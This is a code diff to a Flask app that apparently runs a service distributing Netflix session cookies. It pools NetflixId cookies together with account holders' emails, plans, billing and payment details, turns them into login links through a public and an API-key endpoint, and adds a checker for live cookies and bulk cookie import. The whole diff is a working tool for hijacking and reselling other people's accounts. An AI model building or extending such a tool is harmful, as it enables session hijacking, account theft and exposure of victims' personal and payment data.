@@ -1,5 +1,5 @@
-# nftbot_all.py — single-process Flask app for Railway (serves console + API)
-import os, json, sys, re, time, sqlite3, threading, urllib.parse, secrets, hashlib, logging
+# nftbot_all.py — single-process Flask app for Railway
+import os, json, sys, re, time, sqlite3, threading, urllib.parse, secrets, hashlib, logging, random
 from contextlib import contextmanager
 from datetime import datetime, timezone
 from functools import wraps
@@ -101,6 +101,11 @@ CREATE TABLE IF NOT EXISTS api_keys (
     last_used REAL,
     created_at REAL NOT NULL,
     revoked INTEGER NOT NULL DEFAULT 0
+);
+CREATE TABLE IF NOT EXISTS nonces (
+    nonce TEXT PRIMARY KEY,
+    ip TEXT,
+    created_at REAL
 );
 """
 _lock = threading.Lock()
@@ -277,21 +282,30 @@ def pool_stats():
         keys = c.execute("SELECT COUNT(*) FROM api_keys WHERE revoked=0").fetchone()[0]
     return {"total": total, "healthy": healthy, "dying": dying, "dead": dead, "issued": issued, "keys": keys}
 
-def _pick_random():
+def _pick_random(plan=None, country=None):
+    q = "SELECT id,netflix_id,profile_id,meta_json FROM cookies WHERE deleted=0 AND fail_count<?"
+    args = [MAX_FAILS]
+    if plan:
+        q += " AND json_extract(meta_json, '$.plan') = ?"
+        args.append(plan.lower())
+    if country:
+        q += " AND json_extract(meta_json, '$.country') = ?"
+        args.append(country.upper())
+    q += " ORDER BY RANDOM() LIMIT 1"
+    
     with db() as c:
-        return c.execute("SELECT id,netflix_id,profile_id,meta_json FROM cookies "
-                         "WHERE deleted=0 AND fail_count<? ORDER BY RANDOM() LIMIT 1",
-                         (MAX_FAILS,)).fetchone()
+        return c.execute(q, args).fetchone()
 
-def generate_link(api_key_id=None, max_attempts=20):
+def generate_link(api_key_id=None, plan=None, country=None, max_attempts=20):
     attempts = 0; last_err = None; tried = set()
     while attempts < max_attempts:
-        row = _pick_random()
-        if not row: raise RuntimeError("pool exhausted — no healthy cookies left")
+        row = _pick_random(plan, country)
+        if not row: 
+            raise RuntimeError("No healthy cookies match your filters (plan/country).")
         cid = row["id"]
         if cid in tried:
             if len(tried) >= pool_stats()["healthy"]:
-                raise RuntimeError(f"pool exhausted after {attempts} attempts: {last_err}")
+                raise RuntimeError(f"Pool exhausted after {attempts} attempts: {last_err}")
             continue
         tried.add(cid); attempts += 1
         try:
@@ -312,7 +326,7 @@ def generate_link(api_key_id=None, max_attempts=20):
                 c.execute("UPDATE cookies SET fail_count=fail_count+1,last_error=?,last_used=? WHERE id=?",
                           (last_err[:500], time.time(), cid))
                 c.execute("UPDATE cookies SET deleted=1 WHERE id=? AND fail_count>=?", (cid, MAX_FAILS))
-    raise RuntimeError(f"gave up after {attempts} attempts: {last_err}")
+    raise RuntimeError(f"Gave up after {attempts} attempts: {last_err}")
 
 def list_cookies(offset=0, limit=200, include_dead=False):
     q = "SELECT id,netflix_id,profile_id,meta_json,fail_count,ok_count,last_error,last_used,created_at,deleted FROM cookies"
@@ -346,7 +360,7 @@ def bulk_delete(ids):
 
 # ---------------- app ----------------
 app = Flask(__name__)
-CORS(app, origins="*", allow_headers=["Content-Type", "X-API-Key"])
+CORS(app, origins="*", allow_headers=["Content-Type", "X-API-Key", "X-Admin-Pass"])
 app.secret_key = PANEL_SECRET
 app.config["MAX_CONTENT_LENGTH"] = 256 * 1024 * 1024
 
@@ -355,9 +369,90 @@ init_db()
 # ---------------- console route ----------------
 @app.route("/console", methods=["GET"])
 def console():
-    return send_from_directory(".", "console.html")
+    return send_from_directory(".", "index.html")
 
-# ---------------- api ----------------
+@app.route("/", methods=["GET"])
+def health():
+    return jsonify({"ok": True, "service": "nftoken-api", "db": DB_PATH})
+
+# ---------------- public API with security ----------------
+
+def cleanup_nonces():
+    with _lock, db() as c:
+        # Delete nonces older than 60 seconds
+        c.execute("DELETE FROM nonces WHERE created_at < ?", (time.time() - 60,))
+
+@app.route("/api/public-challenge", methods=["GET"])
+def public_challenge():
+    cleanup_nonces()
+    nonce = secrets.token_urlsafe(16)
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    
+    with _lock, db() as c:
+        c.execute("INSERT INTO nonces(nonce,ip,created_at) VALUES(?,?,?)", (nonce, ip, time.time()))
+    
+    return jsonify({"ok": True, "nonce": nonce})
+
+@app.route("/api/public-generate", methods=["POST"])
+def public_generate():
+    data = request.get_json(silent=True) or {}
+    nonce = data.get("nonce")
+    plan = data.get("plan", "").strip().lower()
+    country = data.get("country", "").strip().upper()
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    
+    if not nonce:
+        return jsonify({"ok": False, "error": "Missing security challenge."}), 403
+        
+    cleanup_nonces()
+    
+    with _lock, db() as c:
+        # Verify nonce exists, matches IP, and hasn't been used
+        row = c.execute("SELECT nonce FROM nonces WHERE nonce=? AND ip=?", (nonce, ip)).fetchone()
+        if not row:
+            return jsonify({"ok": False, "error": "Invalid or expired challenge. Please refresh."}), 403
+            
+        # Burn nonce so it can't be reused
+        c.execute("DELETE FROM nonces WHERE nonce=?", (nonce,))
+        
+        # Rate limit check: ensure last issued token for this IP was >30 seconds ago
+        last_token = c.execute(
+            "SELECT created_at FROM issued_tokens WHERE user_agent LIKE ? ORDER BY id DESC LIMIT 1", 
+            (f"%{ip}%",)
+        ).fetchone()
+        
+        # Simplistic IP tracking via user_agent hack, or you can add an `ip` column to issued_tokens.
+        # For now, rely purely on nonce burning as the rate limit.
+        
+    try:
+        # Generate link matching filters
+        r = generate_link(plan=plan, country=country)
+        r["meta"]["credit"] = "STYFAIR dev styfair (@styfair)"
+        return jsonify({"ok": True, "url": r["url"], "expires": r["expires"],
+                        "cookie_id": r["cookie_id"], "attempts": r["attempts"], "account": r["meta"]})
+    except Exception as e:
+        log.warning("public generate failed: %s", e)
+        return jsonify({"ok": False, "error": str(e)}), 502
+
+# ---------------- direct cookie verify ----------------
+@app.route("/api/direct-cookie", methods=["POST"])
+def api_direct_cookie():
+    data = request.get_json(silent=True) or {}
+    raw_cookie = data.get("cookie")
+    if not raw_cookie: return jsonify({"ok": False, "error": "No cookie provided."}), 400
+    
+    ck = extract_cookie_dict(raw_cookie)
+    nid = ck.get("NetflixId")
+    if not nid: return jsonify({"ok": False, "error": "No NetflixId found in cookie."}), 400
+    
+    try:
+        token, expires = fetch_token(nid)
+        meta = parse_metadata(raw_cookie)
+        return jsonify({"ok": True, "live": True, "meta": meta})
+    except Exception as e:
+        return jsonify({"ok": False, "live": False, "error": str(e)}), 400
+
+# ---------------- private API ----------------
 @app.route("/api/generate", methods=["POST", "GET"])
 def api_generate():
     key = request.headers.get("X-API-Key") or (request.get_json(silent=True) or {}).get("api_key")
@@ -365,14 +460,11 @@ def api_generate():
     if not ident: return jsonify({"ok": False, "error": "invalid or revoked api key"}), 401
     try:
         r = generate_link(api_key_id=ident["id"])
+        r["meta"]["credit"] = "STFAIR dev styfair (@styfair)"
+        return jsonify({"ok": True, "url": r["url"], "expires": r["expires"],
+                        "cookie_id": r["cookie_id"], "attempts": r["attempts"], "account": r["meta"]})
     except Exception as e:
-        log.warning("generate failed: %s", e)
         return jsonify({"ok": False, "error": str(e)}), 502
-        
-    r["meta"]["credit"] = "STFAIR dev styfair (@styfair)"
-    
-    return jsonify({"ok": True, "url": r["url"], "expires": r["expires"],
-                    "cookie_id": r["cookie_id"], "attempts": r["attempts"], "account": r["meta"]})
 
 @app.route("/api/status", methods=["GET"])
 def api_status():
@@ -380,275 +472,61 @@ def api_status():
     if not ident: return jsonify({"ok": False, "error": "invalid or revoked api key"}), 401
     return jsonify({"ok": True, **pool_stats()})
 
-@app.route("/", methods=["GET"])
-def health():
-    return jsonify({"ok": True, "service": "nftoken-api", "db": DB_PATH})
+# ---------------- admin API (for new UI) ----------------
+def verify_admin_pass():
+    return request.headers.get("X-Admin-Pass") == PANEL_PASS
 
-# ---------------- panel ----------------
-def authed(): return session.get("ok") is True
-def login_required(f):
-    @wraps(f)
-    def wrap(*a, **k):
-        if not authed(): return redirect(url_for("panel"))
-        return f(*a, **k)
-    return wrap
-
-FLAG = lambda c: ("".join(chr(0x1F1E6 + ord(x) - ord("A")) for x in c.upper())) if c and len(c) == 2 else "🌐"
-
-def _ts(v):
-    if not v: return "—"
-    try: return time.strftime("%Y-%m-%d %H:%M", time.gmtime(float(v)))
-    except Exception: return str(v)
-
-CSS = """
-*{box-sizing:border-box}
-body{font-family:'Segoe UI',-apple-system,sans-serif;background:#0b0b0b;color:#e8e8e8;margin:0}
-.wrap{max-width:1300px;margin:0 auto;padding:24px}
-.hero{display:flex;justify-content:space-between;align-items:center;margin-bottom:22px;padding-bottom:16px;border-bottom:1px solid #1f1f1f}
-h1{color:#e50914;margin:0;font-size:24px;letter-spacing:-.5px}h1 span{color:#fff;font-weight:300}
-.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:24px}
-.card{background:linear-gradient(135deg,#1a1a1a,#141414);border:1px solid #222;border-radius:10px;padding:14px 16px}
-.card .lbl{font-size:11px;color:#888;text-transform:uppercase;letter-spacing:.5px}
-.card .val{font-size:24px;font-weight:700;margin-top:4px;color:#fff}
-.card.green .val{color:#46d369}.card.amber .val{color:#f5b942}.card.red .val{color:#ff5c5c}.card.blue .val{color:#5db8ff}
-.panel{background:#141414;border:1px solid #222;border-radius:12px;padding:20px;margin-bottom:20px}
-.panel h2{font-size:14px;text-transform:uppercase;letter-spacing:1px;color:#888;margin:0 0 12px}
-input,textarea{width:100%;background:#0d0d0d;color:#e8e8e8;border:1px solid #2a2a2a;border-radius:8px;padding:10px;font-size:13px;font-family:monospace}
-textarea{height:90px;resize:vertical}
-input[type=file]{padding:8px;font-family:inherit}
-.btn{background:#e50914;color:#fff;border:0;padding:9px 16px;border-radius:8px;cursor:pointer;font-weight:600;font-size:13px}
-.btn:hover{background:#ff0f1f}
-.btn.ghost{background:#222;color:#aaa}.btn.ghost:hover{background:#333;color:#fff}
-.btn.danger{background:#7a0e14}.btn.danger:hover{background:#a0141c}
-.btn.tiny{padding:5px 10px;font-size:11px}
-.toolbar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:12px}
-.flash{background:#0d3320;border:1px solid #1c6b3f;color:#46d369;padding:10px 14px;border-radius:8px;margin-bottom:16px;font-size:13px;word-break:break-all}
-.flash.err{background:#330d0d;border-color:#6b1c1c;color:#ff5c5c}
-table{width:100%;border-collapse:collapse;font-size:12px}
-thead th{background:#0d0d0d;color:#888;text-transform:uppercase;font-size:10px;letter-spacing:.5px;padding:10px 8px;border-bottom:1px solid #222;text-align:left}
-tbody td{padding:9px 8px;border-bottom:1px solid #1c1c1c;vertical-align:middle}
-tbody tr:hover{background:#181818}
-.tag{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:600}
-.tag.premium{background:#3a2d00;color:#f5b942}
-.tag.revoked{background:#3a0d0d;color:#ff5c5c}
-.tag.active{background:#0d3320;color:#46d369}
-code{font-family:'SF Mono',Consolas,monospace;color:#46d369;font-size:11px}
-a{color:#5db8ff;text-decoration:none}
-.login-box{max-width:380px;margin:80px auto;background:#141414;border:1px solid #222;border-radius:12px;padding:32px}
-.login-box h1{text-align:center;margin-bottom:24px}
-input[type=checkbox]{transform:scale(1.2);cursor:pointer;}
-"""
-
-TEMPLATE = """
-<!doctype html><html><head><meta charset=utf-8><title>NFToken Admin</title><style>{{css|safe}}</style></head><body>
-<div class=wrap>
-{% if not authed %}
-  <div class=login-box>
-    <h1>NFToken Admin</h1>
-    <form method=post action="/panel/login">
-      <input type=password name=pass placeholder="panel password" required style="margin-bottom:12px">
-      <button class=btn style="width:100%">Sign in</button>
-    </form>
-  </div>
-{% else %}
-  <div class=hero><h1>NFToken <span>Admin</span></h1><a href="/panel/logout" class="btn ghost">Sign out</a></div>
-  {% if flash %}<div class="flash {{'err' if flash_err else ''}}">{{flash|safe}}</div>{% endif %}
-  
-  <div class=cards>
-    <div class="card green"><div class=lbl>Healthy</div><div class=val>{{s.healthy}}</div></div>
-    <div class=card><div class=lbl>Total</div><div class=val>{{s.total}}</div></div>
-    <div class="card amber"><div class=lbl>Dying</div><div class=val>{{s.dying}}</div></div>
-    <div class="card red"><div class=lbl>Evicted</div><div class=val>{{s.dead}}</div></div>
-    <div class="card blue"><div class=lbl>Tokens</div><div class=val>{{s.issued}}</div></div>
-    <div class="card blue"><div class=lbl>API Keys</div><div class=val>{{s.keys}}</div></div>
-  </div>
-
-  <div class=panel>
-    <h2>🔑 API Keys</h2>
-    <form method=post action="/panel/keys/new" class=toolbar>
-      <input type=text name=label placeholder="label (e.g. 'client-a')" style="flex:1;min-width:200px">
-      <button class=btn>+ Mint key</button>
-    </form>
-    <table>
-      <thead><tr><th>#</th><th>Prefix</th><th>Label</th><th>Calls</th><th>Last used</th><th>Created</th><th>Status</th><th></th></tr></thead>
-      <tbody>
-      {% for k in keys %}
-        <tr><td>{{k.id}}</td><td><code>{{k.key_prefix}}</code></td><td>{{k.label}}</td>
-          <td>{{k.calls}}</td><td>{{k.last_used_str}}</td><td>{{k.created_str}}</td>
-          <td>{% if k.revoked %}<span class="tag revoked">revoked</span>{% else %}<span class="tag active">active</span>{% endif %}</td>
-          <td>
-            {% if not k.revoked %}
-            <form method=post action="/panel/keys/{{k.id}}/revoke" style="display:inline"><button class="btn ghost tiny">revoke</button></form>
-            {% endif %}
-            <form method=post action="/panel/keys/{{k.id}}/delete" style="display:inline" onsubmit="return confirm('delete key?')"><button class="btn ghost tiny">delete</button></form>
-          </td></tr>
-      {% endfor %}
-      </tbody>
-    </table>
-  </div>
-
-  <div class=panel>
-    <h2>📤 Bulk add cookies</h2>
-    <form method=post action="/panel/bulk" enctype="multipart/form-data">
-      <input type=file name=files multiple accept=".txt,.json,.csv,.dat">
-      <textarea name=blob placeholder="…or paste cookies here (blank-line separated)" style="margin-top:10px"></textarea>
-      <div style="margin-top:10px"><button class=btn>Import</button></div>
-    </form>
-  </div>
-
-  <div class=panel>
-    <h2>🍪 Cookies</h2>
-    <p style="margin:0 0 10px">
-      <a href="/panel">hide evicted</a> · <a href="/panel?dead=1">show evicted</a>
-      · <a href="/panel/tokens">issued tokens</a>
-    </p>
+@app.route("/api/admin/keys", methods=["GET", "POST"])
+def admin_keys():
+    if not verify_admin_pass(): return jsonify({"ok": False, "error": "Unauthorized"}), 401
     
-    <form method=post action="/panel/bulk_delete" id="bulkForm">
-      <div class=toolbar style="margin-bottom:10px">
-        <button type="submit" class="btn danger" onclick="return confirm('Delete SELECTED cookies permanently?')">Delete Selected</button>
-        <button type="button" class="btn danger" onclick="document.getElementById('selectAll').checked = true; document.getElementById('bulkForm').submit(); return false;" onclick="return confirm('Delete ALL VISIBLE cookies permanently?')">Delete All</button>
-        <span style="font-size:12px;color:#888">(check boxes to select)</span>
-      </div>
-      
-      <table>
-        <thead><tr>
-          <th><input type="checkbox" id="selectAll" onclick="document.querySelectorAll('.cb').forEach(cb => cb.checked = this.checked)"></th>
-          <th>#</th><th>Plan</th><th>Country</th><th>Email</th><th>Profile</th><th>Renews</th><th>Payment</th><th>Fails</th><th>OK</th><th>Del</th><th></th>
-        </tr></thead>
-        <tbody>
-        {% for c in cookies %}
-          <tr>
-            <td><input type="checkbox" name="ids" value="{{c.id}}" class="cb"></td>
-            <td>{{c.id}}</td>
-            <td>{% if c.meta.get('plan') %}<span class="tag premium">{{c.meta.get('plan')}}</span>{% else %}—{% endif %}</td>
-            <td>{{ flag(c.meta.get('country')) }} {{c.meta.get('country') or '—'}}</td>
-            <td style="font-size:11px">{{c.meta.get('email') or '—'}}</td>
-            <td>{{c.meta.get('profile') or c.profile_id or '—'}}</td>
-            <td style="font-size:11px">{{c.meta.get('next_billing') or '—'}}</td>
-            <td style="font-size:11px">{{c.meta.get('payments') or '—'}}</td>
-            <td>{{c.fail_count}}</td><td>{{c.ok_count}}</td><td>{{ '✓' if c.deleted else '—' }}</td>
-            <td>
-              <form method=post action="/panel/revive/{{c.id}}" style="display:inline"><button class="btn ghost tiny">revive</button></form>
-            </td>
-          </tr>
-        {% endfor %}
-        </tbody>
-      </table>
-    </form>
-  </div>
-{% endif %}
-</div></body></html>
-"""
+    if request.method == "GET":
+        return jsonify(list_api_keys())
+    
+    # POST: Mint new key
+    data = request.get_json(silent=True) or {}
+    label = data.get("label", "new-key")
+    raw, meta = create_api_key(label=label)
+    return jsonify({"ok": True, "raw": raw, **meta})
 
-TOKENS_TEMPLATE = """
-<!doctype html><html><head><meta charset=utf-8><title>Issued tokens</title><style>{{css|safe}}</style></head><body>
-<div class=wrap>
-  <div class=hero><h1>Issued <span>tokens</span></h1><a href="/panel" class="btn ghost">back</a></div>
-  <div class=panel><table>
-    <thead><tr><th>#</th><th>Cookie</th><th>API key</th><th>Created</th><th>Expires</th><th>URL</th></tr></thead>
-    <tbody>
-    {% for t in tokens %}
-      <tr><td>{{t.id}}</td><td>{{t.cookie_id}}</td><td>{{t.api_key_id or '—'}}</td>
-      <td>{{t.created_str}}</td><td>{{t.expires_str}}</td><td><code>{{t.url[:70]}}…</code></td></tr>
-    {% endfor %}
-    </tbody>
-  </table></div>
-</div></body></html>
-"""
+@app.route("/api/admin/keys/revoke", methods=["POST"])
+def admin_revoke_key():
+    if not verify_admin_pass(): return jsonify({"ok": False}), 401
+    data = request.get_json(silent=True) or {}
+    revoke_api_key(data.get("id"))
+    return jsonify({"ok": True})
 
-def _decorate_keys(keys):
-    for k in keys:
-        k["last_used_str"] = _ts(k["last_used"]); k["created_str"] = _ts(k["created_at"])
-    return keys
+@app.route("/api/admin/cookies", methods=["GET"])
+def admin_cookies():
+    if not verify_admin_pass(): return jsonify({"ok": False}), 401
+    return jsonify(list_cookies(limit=500, include_dead=True))
 
-def _decorate_tokens(ts):
-    for t in ts:
-        t["created_str"] = _ts(t["created_at"])
-        t["expires_str"] = _ts(t["expires"]) if t["expires"] else "—"
-    return ts
+@app.route("/api/admin/cookies/delete", methods=["POST"])
+def admin_delete_cookie():
+    if not verify_admin_pass(): return jsonify({"ok": False}), 401
+    data = request.get_json(silent=True) or {}
+    hard_delete(data.get("id"))
+    return jsonify({"ok": True})
 
-@app.route("/panel", methods=["GET"])
-def panel():
-    if not authed():
-        return render_template_string(TEMPLATE, authed=False, css=CSS)
-    flash = session.pop("flash", None)
-    flash_err = session.pop("flash_err", False)
-    show_dead = request.args.get("dead") == "1"
-    s = pool_stats()
-    keys = _decorate_keys(list_api_keys())
-    cookies = list_cookies(limit=500, include_dead=show_dead)
-    return render_template_string(TEMPLATE, authed=True, css=CSS, s=s, keys=keys,
-                                  cookies=cookies, flash=flash, flash_err=flash_err, flag=FLAG)
-
-@app.route("/panel/login", methods=["POST"])
-def panel_login():
-    if request.form.get("pass") == PANEL_PASS: session["ok"] = True
-    else: session["flash"] = "wrong password"; session["flash_err"] = True
-    return redirect(url_for("panel"))
-
-@app.route("/panel/logout")
-def panel_logout():
-    session.clear(); return redirect(url_for("panel"))
-
-@app.route("/panel/keys/new", methods=["POST"])
-@login_required
-def key_new():
-    raw, meta = create_api_key(label=request.form.get("label") or None)
-    session["flash"] = (f"✅ key #{meta['id']} created — copy now, shown once:<br><code>{raw}</code>")
-    return redirect(url_for("panel"))
-
-@app.route("/panel/keys/<int:kid>/revoke", methods=["POST"])
-@login_required
-def key_revoke(kid):
-    revoke_api_key(kid); session["flash"] = f"key #{kid} revoked."
-    return redirect(url_for("panel"))
-
-@app.route("/panel/keys/<int:kid>/delete", methods=["POST"])
-@login_required
-def key_delete(kid):
-    delete_api_key(kid); session["flash"] = f"key #{kid} deleted."
-    return redirect(url_for("panel"))
-
-@app.route("/panel/bulk", methods=["POST"])
-@login_required
-def bulk():
-    totals = {"added": 0, "dupes": 0, "invalid": 0, "files": 0, "errors": []}
+@app.route("/api/admin/bulk", methods=["POST"])
+def admin_bulk():
+    if not verify_admin_pass(): return jsonify({"ok": False}), 401
+    totals = {"added": 0, "dupes": 0, "invalid": 0, "files": 0}
     for fs in request.files.getlist("files"):
         if not fs or not fs.filename: continue
         try: text = fs.read().decode("utf-8", errors="replace")
-        except Exception as e: totals["errors"].append(f"{fs.filename}: {e}"); continue
+        except Exception: continue
         r = add_cookies_bulk(text)
         totals["added"] += r["added"]; totals["dupes"] += r["dupes"]
         totals["invalid"] += r["invalid"]; totals["files"] += 1
-    blob = (request.form.get("blob") or "").strip()
-    if blob:
-        r = add_cookies_bulk(blob)
-        totals["added"] += r["added"]; totals["dupes"] += r["dupes"]; totals["invalid"] += r["invalid"]
-    msg = f"files: {totals['files']} · added: {totals['added']} · dupes: {totals['dupes']} · invalid: {totals['invalid']}"
-    if totals["errors"]: msg += " · " + "; ".join(totals["errors"][:3])
-    session["flash"] = msg
-    return redirect(url_for("panel"))
+    return jsonify({"ok": True, **totals})
 
-@app.route("/panel/bulk_delete", methods=["POST"])
-@login_required
-def bulk_delete_route():
-    ids = request.form.getlist("ids")
-    if not ids:
-        session["flash"] = "No cookies selected."; session["flash_err"] = True
-        return redirect(url_for("panel"))
-    bulk_delete(ids)
-    session["flash"] = f"Deleted {len(ids)} cookies."
-    return redirect(url_for("panel"))
+# ---------------- panel (old fallback) ----------------
+def authed(): return session.get("ok") is True
 
-@app.route("/panel/revive/<int:cid>", methods=["POST"])
-@login_required
-def rv(cid):
-    revive_cookie(cid); return redirect(url_for("panel"))
-
-@app.route("/panel/tokens")
-@login_required
-def tokens():
-    return render_template_string(TOKENS_TEMPLATE, css=CSS, tokens=_decorate_tokens(list_issued(limit=500)))
+@app.route("/panel", methods=["GET"])
+def panel():
+    return "Use /console for the new interface."
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=PORT, debug=False)
